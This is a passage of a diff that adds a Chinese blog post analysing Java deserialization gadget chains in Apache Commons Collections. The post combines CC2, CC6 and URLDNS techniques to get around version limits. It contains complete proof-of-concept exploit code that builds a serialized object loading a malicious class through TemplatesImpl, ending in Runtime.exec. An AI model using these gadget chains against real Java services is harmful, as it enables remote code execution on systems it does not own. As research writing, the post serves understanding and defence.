+        Constructor construct =  clazz.getDeclaredConstructor(Map.class, Transformer.class);
+        construct.setAccessible(true);
+        Map outerMap = (Map) construct.newInstance(innerMap, transformerChain);
+
+        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;eas1&quot;);
+        Map expMap = new HashMap();
+        expMap.put(tme, &quot;eas2&quot;);
+        outerMap.remove(&quot;eas1&quot;);
+        //把真正的transformers数组换回来
+        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        f.setAccessible(true);
+        f.set(transformerChain, transformers);
+        //序列化
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;./test.ser&quot;));
+        objectOutputStream.writeObject(expMap);
+        objectOutputStream.close();
+        //反序列化
+        ObjectInputStream objectInputStream =new ObjectInputStream(new FileInputStream(&quot;./test.ser&quot;));
+        objectInputStream.readObject();
+        objectInputStream.close();
+
+    &#125;
+&#125;</code></pre>
+<p><img src="/images/408.png"></p>
+<p><img src="/images/409.png"></p>
+<p><strong><code>CommonsCollection2</code>为何在<code>CommonsCollections3.1-3.2.1</code>版本不能去使用，又如何解决呢？</strong></p>
+<p><strong>环境</strong></p>
+<pre><code>CommonsCollections 3.1
+JDK8u_101</code></pre>
+<p>因为在<code>3.1-3.2.1</code>版本中<code>TransformingComparator</code>没有实现<code>Serializable</code>接口，所以就没法被序列化/反序列化。</p>
+<p><img src="/images/410.png"></p>
+<p><strong>解决</strong></p>
+<p>利用<code>LazyMap.get()</code>方法触发<code>InvokerTransformer.transform()</code>，其实还是<code>URLDNS+CC1+CC2</code>拼接来的。</p>
+<p><strong>Gadget链条</strong></p>
+<pre><code>Gadget chain:
+    ObjectInputStream.readObject()
+        HashMap.readObject()
+            HashMap.hash()
+                TiedMapEntry.hashCode()
+                    TiedMapEntry.getValue()
+                        LazyMap.get()
+                            ChainedTransformer.transform()
+                                InvokerTransformer.transform()
+                                    Method.invoke()
+                                        TemplatesImpl.newTransformer()
+                                            TemplatesImpl.getTransletInstance()
+                                                TemplatesImpl.defineTransletClasses()
+                                                    TransletClassLoader.defineClass()
+                                                        newInstance()
+                                                            Runtime.getRuntime().exec(&quot;calc.exe&quot;)</code></pre>
+<p><strong>最终POC代码</strong></p>
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.*;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommmonsCollections2 &#123;
+
+    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, TransformerConfigurationException, ClassNotFoundException &#123;
+
+        TemplatesImpl templates=new TemplatesImpl();
+        //获取TemplatesImpl的Class
+        Class tc=templates.getClass();
+        Field nameField=tc.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaaa&quot;);
+        Field bytecodesField=tc.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        //加载恶意类
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\test\\CommonsCollections2\\out\\production\\CommonsCollections2\\Evil.class&quot;));
+        byte[][] codes=&#123;code&#125;;
+        bytecodesField.set(templates,codes);
+
+        Field tfactoryField=tc.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+        //调用
+        //templates.newTransformer();
+
+
+        Transformer[] fakeTransformers = new Transformer[]&#123;new ConstantTransformer(1)&#125;;
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(templates),
+                new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;),
+
+        &#125;;
+
+        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry tme = new TiedMapEntry(outerMap, &quot;eas1&quot;);
+        Map expMap = new HashMap();
+        expMap.put(tme, &quot;eas2&quot;);
+        outerMap.remove(&quot;eas1&quot;);
+        //把真正的transformers数组换回来
+        Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);
+        f.setAccessible(true);
+        f.set(transformerChain, transformers);
+        //序列化
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;./test.ser&quot;));
+        objectOutputStream.writeObject(expMap);
+        objectOutputStream.close();
+        //反序列化
+        ObjectInputStream objectInputStream =new ObjectInputStream(new FileInputStream(&quot;./test.ser&quot;));
+        objectInputStream.readObject();
+        objectInputStream.close();
+
+    &#125;
+&#125;</code></pre>
+<p><img src="/images/411.png"></p>
+<p><img src="/images/412.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很多链条单独使用往往局限性都很高，但是几条链条互相弥补对方的不足之处就会重新变成一条通用性很高的链条。学完一条链条后，应该多思考思考链条与链条之间的关系，让其发挥更大的作用。没有什么垃圾的利用链，每一条利用链存在都一定有它的作用。一条利用链能发挥多大的作用就看使用他的人如何了。</p>
+<p><code>URLDNS、CC1、CC2、CC6</code>，当这4条链分开使用，每一条都有其局限限。要么<code>JDK</code>版本限制，要么<code>CommonsCollections</code>版本限制，当把它们组合在一起，所有问题都迎刃而解了。</p>
+<p>以上是作者自己的见解，有错之处望大家指点。</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&mid=2247483897&idx=1&sn=b8d6b00abc2c8be1abafd30814f9f9d6&chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&mpshare=1&scene=23&srcid=0323jXdEcEHNJge9w3mo70Dd&sharer_sharetime=1648029968549&sharer_shareid=dc36502b1594ec1d7af81618398b34e5#rd">Java反序列化-CommonsCollections2分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/43424242846b">Javassist 使用指南（一）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43818995/article/details/122184245">CommonsCollections2分析</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">0xEaS</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://keepaha.com/2022/03/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollections2%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/">http://keepaha.com/2022/03/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollections2%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">0xEaS</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/03/28/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollections3%E7%9A%84%E7%94%B1%E6%9D%A5/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="JAVA反序列篇-CommonsCollections3的由来">
+                        
+                        <span class="card-title">JAVA反序列篇-CommonsCollections3的由来</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            0xEaS
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/23/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E7%AF%87-CommonsCollecion6%E5%88%86%E6%9E%90/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="JAVA反序列篇-CommonsCollecion6分析">
+                        
+                        <span class="card-title">JAVA反序列篇-CommonsCollecion6分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            0xEaS
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">0xEaS</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/chenguangyi1/chenguangyi1.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:742917877@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=742917877" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 742917877" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
